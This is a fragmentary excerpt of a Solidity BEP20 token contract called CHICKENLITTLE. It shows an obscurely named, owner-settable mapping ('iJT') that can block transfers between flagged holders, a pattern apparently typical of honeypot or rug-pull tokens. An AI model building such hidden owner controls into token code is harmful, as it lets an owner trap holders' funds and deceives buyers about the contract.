...
contract CHICKENLITTLE is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "CHICKENLITTLE";
    string constant _symbol = "CHICKLIT";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!iJT[sender] || !iJT[recipient]);
    ...
    function setiJT(address holder, bool exempt) external authorized {
        iJT[holder] = exempt;
    }
